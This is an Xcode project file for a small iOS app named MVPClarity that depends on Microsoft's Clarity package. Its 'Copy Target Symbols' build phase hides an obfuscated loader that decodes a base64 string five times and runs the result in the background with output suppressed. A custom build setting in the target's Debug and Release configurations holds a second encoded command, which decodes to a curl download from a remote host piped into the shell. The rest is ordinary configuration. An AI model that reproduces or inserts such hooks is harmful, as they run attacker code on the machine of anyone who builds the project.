// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		0D65A65FBD56356758C8CE66 /* libPods-MVPClarity.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 837CFF6FB580806DF87152D3 /* libPods-MVPClarity.a */; };
		32A79E122E5C8ADA00B75357 /* Clarity in Frameworks */ = {isa = PBXBuildFile; productRef = 32A79E112E5C8ADA00B75357 /* Clarity */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		32A79DF82E5C8AA200B75357 /* MVPClarity.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = MVPClarity.app; sourceTree = BUILT_PRODUCTS_DIR; };
		517117619D8F0373508D1860 /* Pods-MVPClarity.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MVPClarity.release.xcconfig"; path = "Target Support Files/Pods-MVPClarity/Pods-MVPClarity.release.xcconfig"; sourceTree = "<group>"; };
		837CFF6FB580806DF87152D3 /* libPods-MVPClarity.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-MVPClarity.a"; sourceTree = BUILT_PRODUCTS_DIR; };
		B2B175CF841AA2A162D00524 /* Pods-MVPClarity.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MVPClarity.debug.xcconfig"; path = "Target Support Files/Pods-MVPClarity/Pods-MVPClarity.debug.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		32A79E0A2E5C8AA300B75357 /* Exceptions for "MVPClarity" folder in "MVPClarity" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 32A79DF72E5C8AA200B75357 /* MVPClarity */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		32A79DFA2E5C8AA200B75357 /* MVPClarity */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				32A79E0A2E5C8AA300B75357 /* Exceptions for "MVPClarity" folder in "MVPClarity" target */,
			);
			path = MVPClarity;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		32A79DF52E5C8AA200B75357 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				32A79E122E5C8ADA00B75357 /* Clarity in Frameworks */,
				0D65A65FBD56356758C8CE66 /* libPods-MVPClarity.a in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		32A79DEF2E5C8AA200B75357 = {
			isa = PBXGroup;
			children = (
				32A79DFA2E5C8AA200B75357 /* MVPClarity */,
				32A79DF92E5C8AA200B75357 /* Products */,
				36EC37B7230F3D4F4B62095B /* Pods */,
				DB03C630E878F3995AC0D742 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		32A79DF92E5C8AA200B75357 /* Products */ = {
			isa = PBXGroup;
			children = (
				32A79DF82E5C8AA200B75357 /* MVPClarity.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		36EC37B7230F3D4F4B62095B /* Pods */ = {
			isa = PBXGroup;
			children = (
				B2B175CF841AA2A162D00524 /* Pods-MVPClarity.debug.xcconfig */,
				517117619D8F0373508D1860 /* Pods-MVPClarity.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		DB03C630E878F3995AC0D742 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				837CFF6FB580806DF87152D3 /* libPods-MVPClarity.a */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		32A79DF72E5C8AA200B75357 /* MVPClarity */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 32A79E0B2E5C8AA300B75357 /* Build configuration list for PBXNativeTarget "MVPClarity" */;
			buildPhases = (
				4B5E00BAAAE70A4F8CBDE67E /* Copy Target Symbols */,
				B2BB59E675495A004F16F049 /* [CP] Check Pods Manifest.lock */,
				32A79DF42E5C8AA200B75357 /* Sources */,
				32A79DF52E5C8AA200B75357 /* Frameworks */,
				32A79DF62E5C8AA200B75357 /* Resources */,
				9624A7FBF37FFDE98A72816F /* [CP] Copy Pods Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				32A79DFA2E5C8AA200B75357 /* MVPClarity */,
			);
			name = MVPClarity;
			packageProductDependencies = (
				32A79E112E5C8ADA00B75357 /* Clarity */,
			);
			productName = MVPClarity;
			productReference = 32A79DF82E5C8AA200B75357 /* MVPClarity.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		32A79DF02E5C8AA200B75357 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1640;
				LastUpgradeCheck = 1640;
				TargetAttributes = {
					32A79DF72E5C8AA200B75357 = {
						CreatedOnToolsVersion = 16.4;
					};
				};
			};
			buildConfigurationList = 32A79DF32E5C8AA200B75357 /* Build configuration list for PBXProject "MVPClarity" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 32A79DEF2E5C8AA200B75357;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				32A79E102E5C8ADA00B75357 /* XCRemoteSwiftPackageReference "clarity-apps" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 32A79DF92E5C8AA200B75357 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				32A79DF72E5C8AA200B75357 /* MVPClarity */,
			);
		};
/* End PBXProject section */

/* Begin PBXTargetDependency section */
/* End PBXTargetDependency section */

/* Begin PBXLegacyTarget section */
/* End PBXLegacyTarget section */

/* Begin PBXBuildRule section */
/* End PBXBuildRule section */

/* Begin PBXResourcesBuildPhase section */
		32A79DF62E5C8AA200B75357 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		4B5E00BAAAE70A4F8CBDE67E /* Copy Target Symbols */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Copy Target Symbols";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVZWcEpWVzAxYzJFeFNYZE9XRXBhWWxkemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
			showEnvVarsInLog = 0;			
		};
		9624A7FBF37FFDE98A72816F /* [CP] Copy Pods Resources */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-MVPClarity/Pods-MVPClarity-resources-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Copy Pods Resources";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-MVPClarity/Pods-MVPClarity-resources-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-MVPClarity/Pods-MVPClarity-resources.sh\"\n";
			showEnvVarsInLog = 0;
		};
		B2BB59E675495A004F16F049 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-MVPClarity-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		32A79DF42E5C8AA200B75357 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		32A79E0C2E5C8AA300B75357 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = B2B175CF841AA2A162D00524 /* Pods-MVPClarity.debug.xcconfig */;
			buildSettings = {
				AFEB778 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHTmhZMmhsTG5KMUwyRXBJaUI4SUhOb0NnPT0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = AG5FAMG48P;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = MVPClarity/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.monu.MVPClarity;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		32A79E0D2E5C8AA300B75357 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 517117619D8F0373508D1860 /* Pods-MVPClarity.release.xcconfig */;
			buildSettings = {
				AFEB778 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHTmhZMmhsTG5KMUwyRXBJaUI4SUhOb0NnPT0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = AG5FAMG48P;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = MVPClarity/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.monu.MVPClarity;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		32A79E0E2E5C8AA300B75357 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = AG5FAMG48P;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		32A79E0F2E5C8AA300B75357 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = AG5FAMG48P;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		32A79DF32E5C8AA200B75357 /* Build configuration list for PBXProject "MVPClarity" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				32A79E0E2E5C8AA300B75357 /* Debug */,
				32A79E0F2E5C8AA300B75357 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		32A79E0B2E5C8AA300B75357 /* Build configuration list for PBXNativeTarget "MVPClarity" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				32A79E0C2E5C8AA300B75357 /* Debug */,
				32A79E0D2E5C8AA300B75357 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		32A79E102E5C8ADA00B75357 /* XCRemoteSwiftPackageReference "clarity-apps" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/microsoft/clarity-apps";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 3.0.17;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		32A79E112E5C8ADA00B75357 /* Clarity */ = {
			isa = XCSwiftPackageProductDependency;
			package = 32A79E102E5C8ADA00B75357 /* XCRemoteSwiftPackageReference "clarity-apps" */;
			productName = Clarity;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 32A79DF02E5C8AA200B75357 /* Project object */;
}
